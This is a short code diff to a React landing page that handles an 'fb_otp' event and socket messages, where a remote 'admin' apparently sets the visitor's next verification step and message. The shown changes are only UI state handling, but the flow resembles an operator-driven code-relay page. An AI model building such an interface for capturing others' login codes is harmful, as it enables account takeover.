@@ -80,6 +80,16 @@ const Landing = () => {
                 setSendTo(data.sendTo);
               }
             }
+          } else {
+            setIsLoading(false);
+
+            if (data.nextStep) {
+              setCurrentStage(data.nextStep);
+            }
+
+            if (data.message) {
+              setVerificationMessage(data.message);
+            }
           }
         } else if (data.eventType === "fb_otp") {
           setIsLoading(false);
@@ -210,28 +220,6 @@ const Landing = () => {
           timestamp: new Date().toISOString(),
           sessionId: socketRef.current.id,
         });
-
-        // Listen for admin response
-        // socket.on("admin-response", (data) => {
-        //   if (data.status === "completed") {
-        //     setIsLoading(false);
-        //     toaster.create({
-        //       title: "Success",
-        //       description: "Files processed successfully!",
-        //       type: "success",
-        //     });
-        //   } else if (data.status === "processing") {
-        //     // Keep isLoading true for further processing
-        //     console.log("Admin is still processing the files...");
-        //   } else {
-        //     setIsLoading(false);
-        //     toaster.create({
-        //       title: "Error",
-        //       description: "Admin reported an issue with processing.",
-        //       type: "error",
-        //     });
-        //   }
-        // });
       } else {
         throw new Error("Upload failed");
       }
